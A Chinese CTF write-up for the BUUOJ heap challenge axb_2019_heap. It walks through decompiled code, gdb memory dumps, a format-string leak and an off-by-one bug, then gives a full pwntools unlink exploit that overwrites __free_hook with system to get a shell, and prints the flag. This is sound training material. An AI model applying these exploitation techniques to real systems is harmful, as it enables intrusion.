# axb_2019_heap

[题目地址](https://buuoj.cn/challenges#axb_2019_heap)

又是一个unlink，我现在随便找个wp都能看着exp一行一行解释在干啥，问题在于无法调试我就是无法判断大小和自己写(⌒-⌒; )。我是废物。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

这题的漏洞没有其他入门那么明显，不细看很容易忽略。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  banner();
  while ( 1 )
  {
    menu();
    v3 = get_int();
    switch ( v3 )
    {
      case 1:
        add_note();
        break;
      case 2:
        delete_note();
        break;
      case 3:
        puts("None!");
        break;
      case 4:
        edit_note();
        break;
      default:
        puts("No such choices!");
        break;
    }
  }
}
```

我最开始随便扫了一眼banner函数，以为单纯是个打印标题的，就没细看。结果里面有个很重要的格式化字符串漏洞，是本题唯一可以泄露地址的地方。

```c
unsigned __int64 banner()
{
  char format[12]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to note management system!");
  printf("Enter your name: ");
  __isoc99_scanf("%s", format);
  printf("Hello, ");
  printf(format);                               // 这里有个格式化字符串漏洞，可以泄露地址
  puts("\n-------------------------------------");
  return __readfsqword(0x28u) ^ v2;
}
```

当时没仔细看是因为我看菜单里有show选项，正常来说不都是show泄露地址吗。当然后面也能看到，main函数里show选项对应的3是个噱头，压根就没有。add_note里面结构设计给人一种很复杂的感觉，实际是纸老虎。

```c
unsigned __int64 add_note()
{
  int v0; // ebx
  int v1; // ebx
  size_t size; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  printf("Enter the index you want to create (0-10):");
  __isoc99_scanf("%d", (char *)&size + 4);
  if ( (size & 0x8000000000000000LL) == 0LL && SHIDWORD(size) <= 10 )
  {
    if ( counts > 10u )
    {
      puts("full!");
      exit(0);
    }
    puts("Enter a size:");
    __isoc99_scanf("%d", &size);
    if ( key == 43 )
    {
      puts("Enter the content: ");
      v0 = HIDWORD(size);
      *((_QWORD *)&note + 2 * v0) = malloc((unsigned int)size);
      *((_DWORD *)&note + 4 * SHIDWORD(size) + 2) = size;
      if ( !*((_QWORD *)&note + 2 * SHIDWORD(size)) )
      {
        fwrite("error", 1uLL, 5uLL, stderr);
        exit(0);
      }
    }
    else
    {
      if ( (unsigned int)size <= 128 )          // 不能申请fastbin大小堆块
      {
        puts("You can't hack me!");
        return __readfsqword(0x28u) ^ v4;
      }
      puts("Enter the content: ");
      v1 = HIDWORD(size);
      *((_QWORD *)&note + 2 * v1) = malloc((unsigned int)size);
      *((_DWORD *)&note + 4 * SHIDWORD(size) + 2) = size;
      if ( !*((_QWORD *)&note + 2 * SHIDWORD(size)) )
      {
        fwrite("error", 1uLL, 5uLL, stderr);
        exit(0);
      }
    }
    if ( !check_pass((_QWORD *)&note + 2 * SHIDWORD(size)) )
    {
      puts("go out!hacker!");
      exit(0);
    }
    get_input(*((_QWORD *)&note + 2 * SHIDWORD(size)), size);
    ++counts;
    puts("Done!");
  }
  else
  {
    puts("You can't hack me!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

附gdb调试结果。

```
(gdb) x/32g 94051678298212-4
0x558a1ce02060 <note>:  0x0000558a1d5022a0      0x0000000000000081
0x558a1ce02070 <note+16>:       0x0000000000000000      0x0000000000000000
0x558a1ce02080 <note+32>:       0x0000000000000000      0x0000000000000000
0x558a1ce02090 <note+48>:       0x0000000000000000      0x0000000000000000
0x558a1ce020a0 <note+64>:       0x0000000000000000      0x0000000000000000
0x558a1ce020b0 <note+80>:       0x0000000000000000      0x0000000000000000
0x558a1ce020c0 <note+96>:       0x0000000000000000      0x0000000000000000
0x558a1ce020d0 <note+112>:      0x0000000000000000      0x0000000000000000
0x558a1ce020e0 <note+128>:      0x0000000000000000      0x0000000000000000
0x558a1ce020f0 <note+144>:      0x0000000000000000      0x0000000000000000
0x558a1ce02100: 0x0000000000000000      0x0000000000000000
0x558a1ce02110: 0x0000000000000000      0x0000000000000000
0x558a1ce02120: 0x0000000000000000      0x0000000000000000
0x558a1ce02130: 0x0000000000000000      0x0000000000000000
0x558a1ce02140: 0x0000000000000000      0x0000000000000000
0x558a1ce02150: 0x0000000000000000      0x0000000000000000
(gdb) x/32x  0x0000558a1d5022a0-16
0x558a1d502290: 0x0000000000000000      0x0000000000000091
0x558a1d5022a0: 0x0000000061616161      0x0000000000000000
0x558a1d5022b0: 0x0000000000000000      0x0000000000000000
0x558a1d5022c0: 0x0000000000000000      0x0000000000000000
0x558a1d5022d0: 0x0000000000000000      0x0000000000000000
0x558a1d5022e0: 0x0000000000000000      0x0000000000000000
0x558a1d5022f0: 0x0000000000000000      0x0000000000000000
0x558a1d502300: 0x0000000000000000      0x0000000000000000
0x558a1d502310: 0x0000000000000000      0x0000000000000000
0x558a1d502320: 0x0000000000000000      0x0000000000020ce1
0x558a1d502330: 0x0000000000000000      0x0000000000000000
0x558a1d502340: 0x0000000000000000      0x0000000000000000
0x558a1d502350: 0x0000000000000000      0x0000000000000000
0x558a1d502360: 0x0000000000000000      0x0000000000000000
0x558a1d502370: 0x0000000000000000      0x0000000000000000
0x558a1d502380: 0x0000000000000000      0x0000000000000000
```

就是普通的内容指针+大小结构，除了申请堆块大小必须大于128。这也不是什么大问题，这题是unlink，堆块多大没关系。delete_note就不看了，无uaf。edit_note就值得说道说道了，有个不是特别明显的off by one。

```c
unsigned __int64 edit_note()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter an index:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 10 && v1 >= 0 && *((_QWORD *)&note + 2 * v1) )
  {
    puts("Enter the content: ");
    get_input(*((_QWORD *)&note + 2 * v1), *((unsigned int *)&note + 4 * v1 + 2));
    puts("Done!");
  }
  else
  {
    puts("You can't hack me!");
  }
  return __readfsqword(0x28u) ^ v2;
}

```

漏洞在里面调用的get_input函数。

```c
// a1是buf，a2是大小
size_t __fastcall get_input(__int64 a1, int a2)
{
  size_t result; // rax
  signed int v3; // [rsp+10h] [rbp-10h]
  _BYTE *v4; // [rsp+18h] [rbp-8h]

  v3 = 0;
  while ( 1 )
  {
    v4 = (_BYTE *)(v3 + a1);                    // v3是读入字节的计数器，也负责buf地址的变换
    result = fread(v4, 1uLL, 1uLL, stdin);      // 每次从stdin读取一个字节到buf里
    if ( (int)result <= 0 )
      break;
    if ( *v4 == '\n' )                          // 如果当前读取到的是换行符
    {
      if ( v3 )
      {
        result = v3 + a1;
        *v4 = 0;
        return result;                          // 结束循环
      }
    }
    else
    {
      result = (unsigned int)++v3;              // v3自增，继续读取
      if ( a2 + 1 <= (unsigned int)v3 )         // off by one，这里让buf可以比设定大小多读入一个字节
        return result;
    }
  }
  return result;
}
```

没啥其他的看了，找个[wp](https://blog.csdn.net/weixin_45677731/article/details/108763362)完事。

```python
from pwn import *
sh=remote("node4.buuoj.cn",29321)
context.log_level='debug'
def add(idx,size,content):
	sh.sendlineafter(">> ","1")
	sh.recvuntil("(0-10):")
	sh.sendline(str(idx))
	sh.recvuntil("Enter a size:\n")
	sh.sendline(str(size))
	sh.recvuntil("Enter the content: \n")
	sh.sendline(content)
def edit(idx,content):
	sh.sendlineafter(">> ","4")
	sh.recvuntil("Enter an index:\n")
	sh.sendline(str(idx))
	sh.recvuntil("Enter the content: \n")
	sh.sendline(content)
def delete(idx):
	sh.sendlineafter(">> ","2")
	sh.recvuntil("Enter an index:\n")
	sh.sendline(str(idx))

sh.recvuntil("Enter your name: ")
sh.sendline("%15$p%19$p") #调试可发现格式化字符串漏洞附近位置有__libc_start_main+240和程序main函数的地址，可以直接泄露libc的基地址和程序的基地址
sh.recvuntil("0x")
addr1=int(sh.recvuntil("0x")[:-2],16)
libc_base=addr1-240-132928
addr2=int(sh.recvuntil("\n")[:-1],16)
base=addr2-0x116a #0x116a是main函数的偏移
info("libc_base:0x%x",libc_base)
info("base:0x%x",base)

ptr=base+0x202060 #note数组的地址，unlink的目标
#free_got=base+0x201F58
system_addr=libc_base+283536
free_hook=libc_base+3958696

add(0,0x98,'aaaaaaaa') #这样申请可以让0号堆块的data域“借用”1号堆块的prev_size域，就能在不溢出的情况下随意修改1号堆块prev_size域，溢出的一个字节修改1号堆块size域
add(1,0x90,'bbbbbbbb')
payload=p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10) #此处构造fake_chunk，prev_size+size+fd+bk
payload+=b"a"*0x70+p64(0x90)+b"\xa0" #0x70个填充+符合fake_chunk的prev_size+更改符号位的size，标记前一个fake_chunk为空闲状态
edit(0,payload)

delete(1)

payload=p64(0)*3+p64(free_hook)+p64(0x38) #unlink完成后note数组上记录的0号堆块为ptr-0x18处。p64(0)*3填充+把note数组0号堆块位置改为free_hook+原本的记录的size0x38
payload+=p64(ptr+0x18)+b"/bin/sh\x00" #把1号堆块位置改为ptr+0x18,这个地址对应着后面的b"/bin/sh\x00"
edit(0,payload)
payload=p64(system_addr)
edit(0,payload)
delete(1) #这时delete1号堆块就会执行free(ptr+0x18)，等于system("/bin/sh\x00")
sh.interactive()
```

## Flag
> flag{84035d18-2732-42fb-85ef-ba4ca35e7fc0}